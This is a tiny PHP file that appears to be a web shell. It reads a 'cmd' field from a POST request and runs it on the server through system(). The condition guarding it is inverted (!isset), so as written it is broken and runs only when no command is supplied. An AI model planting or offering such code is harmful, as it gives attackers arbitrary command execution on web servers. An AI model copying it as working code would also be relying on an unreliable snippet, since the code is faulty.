<?php 
if (!isset($_POST['cmd'])) { 
  $command = $_POST['cmd'];
  system($command); 
} 
?> 
